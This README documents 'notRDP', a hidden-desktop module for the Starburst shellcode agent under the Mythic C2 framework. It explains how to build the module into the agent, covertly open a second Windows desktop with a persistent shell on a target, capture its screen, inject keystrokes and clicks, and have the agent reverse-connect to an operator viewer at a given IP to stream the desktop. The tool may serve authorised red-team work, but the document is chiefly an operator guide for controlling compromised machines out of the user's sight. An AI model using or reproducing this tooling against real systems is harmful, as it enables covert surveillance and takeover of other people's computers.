# notRDP for Starburst (Mythic)

A hidden-desktop module for the [Whispergate/Starburst](https://github.com/Whispergate/Starburst) PIC shellcode agent. It creates a second Windows desktop in the agent's user session, launches `explorer.exe` and a persistent shell there, and supports two operator workflows:

- tasked BMP screenshots and `PostMessage` input through Mythic;
- interactive JPEG streaming and input through the included browser viewer.

The live viewer uses an outbound TCP connection from the agent. It does not open a listening port on the target.

This is a port of [dagowda/notRDP](https://github.com/dagowda/notRDP), a Havoc C2 plugin by Dhanush Arvind (MIT). The hidden-desktop technique and input model come from that project. This repository adapts them to Starburst's PIC C++ agent and Mythic tasking model.

```text
Payload type : starburst (PIC shellcode, x64)
Command      : notrdp [start|shot|input|live|stop]
Windows      : 10/11 (tested on Windows 11 25H2)
```

## How it works

1. `start` creates or opens `StarburstHidden`. A NULL DACL in the desktop's `SECURITY_ATTRIBUTES` lets its child processes and later agent instances open it. The command launches `explorer.exe` and `cmd.exe /k` through `STARTUPINFOW.lpDesktop` and returns both PIDs.
2. `shot` temporarily makes the hidden desktop active, captures the desktop surface with `GetDC(NULL)` and `BitBlt`, restores the original desktop, and returns a 24-bit BMP through Mythic's chunked file-transfer path. Windows 10 and 11 only composite the active desktop, so the switch is required for a non-black frame.
3. `input` attaches the command thread to the hidden desktop, resolves the deepest visible child at the supplied coordinates, focuses that window, and posts mouse or keyboard messages to it.
4. `live` starts a worker that reverse-connects to the operator viewer. The worker keeps the hidden desktop active, captures it with `BitBlt`, scales and encodes each frame as JPEG with GDI+, and receives input on the same socket. The original desktop is restored when the stream stops or disconnects.
5. `stop` stops any live worker, terminates the hidden shell and explorer processes, closes the desktop, and frees the agent state.

## Install

Apply the integration patch to Starburst commit `b0365af`, then reinstall the payload type:

```bash
git clone https://github.com/Whispergate/Starburst
cd Starburst
git checkout b0365af
git apply /path/to/patches/starburst-notrdp.patch
./mythic-cli install folder . --force
```

The patch adds `agent_code/src/commands/cmd_notrdp.cc`, `agent_functions/notrdp.py`, command registration, instance state, and translator support. The Starburst builder compiles the module with the same no-CRT and PIC constraints as the rest of the agent.

For tasked screenshots, include `download` and `download_resp` in the payload along with `notrdp`. Mythic uses those commands to finish the chunked BMP transfer.

Use the `mask_default` sleep-mask option for live payloads. The full-image mask can rewrite memory while the live worker is executing.

## Tasked mode

| Task | Effect |
|---|---|
| `notrdp start` | Create the hidden desktop, explorer process, and persistent shell. |
| `notrdp shot` | Return a BMP of the hidden desktop as a Mythic file response. |
| `notrdp input <x> <y> <action> [key]` | Inject mouse or keyboard input. |
| `notrdp stop` | Stop streaming if needed, then tear down the desktop state. |

Input action codes:

| Code | Action | `key` value |
|---:|---|---|
| 0 | mouse move | button mask while dragging, normally `0` |
| 1 | left click | unused |
| 2 | right click | unused |
| 3 | double click | unused |
| 4 / 5 | left down / left up | unused |
| 6 / 7 | right down / right up | unused |
| 8 | mouse wheel | signed delta, normally `120` or `-120` |
| 10 | key press | Windows virtual-key code |
| 11 / 12 | key down / key up | Windows virtual-key code |

A simple tasked session:

```text
notrdp start
notrdp shot
notrdp input 400 300 1
notrdp shot
notrdp input 100 100 10 13     # Enter
notrdp stop
```

Each BMP requires one or more tasking round trips. Agent sleep and frame size determine the transfer time.

## Live browser mode

Start the standalone viewer on an operator system reachable from the target:

```bash
python3 viewer_server.py 8124 --http 8123
```

Port `8124` accepts the agent connection. Port `8123` serves the browser UI. Then task the agent:

```text
notrdp start
notrdp live 10.131.6.174 8124 2 2
```

Open `http://10.131.6.174:8123/` and interact with the streamed desktop. The browser forwards mouse movement, clicks, drags, wheel events, and key up/down events.

The final two numbers are frames per second and the resolution divisor. Valid FPS values are 1 through 10. Valid divisors are 1 through 4. For example, `2 2` sends two frames per second at half width and height. The viewer maps browser coordinates back to the original desktop automatically.

Stop only the stream, or tear down the whole desktop:

```text
notrdp live stop
notrdp stop
```

`viewer_server.py` uses only the Python standard library.

## Network and visibility tradeoffs

- Live traffic is a separate, unauthenticated TCP and HTTP channel. It does not use Mythic C2 encryption, redirectors, routing, or pivot links. Restrict both viewer ports with a firewall or carry them through a tunnel on an authorized network.
- The target must be able to connect directly to the viewer's IPv4 address and agent port.
- The viewer binds both ports to `0.0.0.0` and handles one agent stream at a time.
- Live capture keeps the hidden desktop active for the session. A person watching the target console can see it. The original desktop is restored on `live stop`, disconnect, or `notrdp stop`.
- Tasked `shot` switches desktops for about 0.7 seconds per frame, so a console user can see a brief flicker.

## Operational notes

- Run the agent inside a logged-on user session. Session 0 desktops do not render useful frames, and secondary `explorer.exe` instances can exit there.
- Start live mode only after `notrdp start`. Stop live mode before using the slower tasked screenshot loop.
- A repeated `start` after a clean `stop`, or after an agent restart, adopts an existing `StarburstHidden` desktop instead of failing.
- Synthetic input does not move the user's cursor on the normal desktop. Focus and modality rules still apply inside the hidden desktop, and elevated UI on the secure desktop remains out of reach.
- Capture constants, JPEG quality, desktop name, and switch delay are defined near the top of `cmd_notrdp.cc`.

## Differences from the original

| | [dagowda/notRDP](https://github.com/dagowda/notRDP) (Havoc) | This module (Starburst) |
|---|---|---|
| Delivery | Separate BOFs inside the Havoc Demon | PIC C++ module compiled into Starburst shellcode |
| View | Browser-based JPEG workflow | Browser JPEG stream plus tasked BMP snapshots |
| Capture | `PrintWindow` window compositing | Active-desktop `BitBlt` capture |
| Live transport | Havoc plugin and local viewer workflow | Direct reverse TCP side channel to `viewer_server.py` |
| Shell handling | Replaces the running explorer shell | Leaves the user's explorer untouched and starts a second instance |
| Desktop access | Grants ACLs after creation | Applies a NULL DACL during creation |

Both implementations use `WindowFromPoint` and `PostMessage` for hidden-desktop input. The same focus, UAC, and modal-window limitations apply.

## Attribution

- [dagowda/notRDP](https://github.com/dagowda/notRDP) by Dhanush Arvind, the original Havoc C2 hidden-desktop plugin (MIT).
- [Whispergate/Starburst](https://github.com/Whispergate/Starburst), the PIC agent framework used by this module (BSD-2-Clause).

## License

MIT, see [LICENSE](LICENSE). Code derived from dagowda/notRDP remains under MIT. Starburst integration code follows the upstream project's BSD-2-Clause terms.
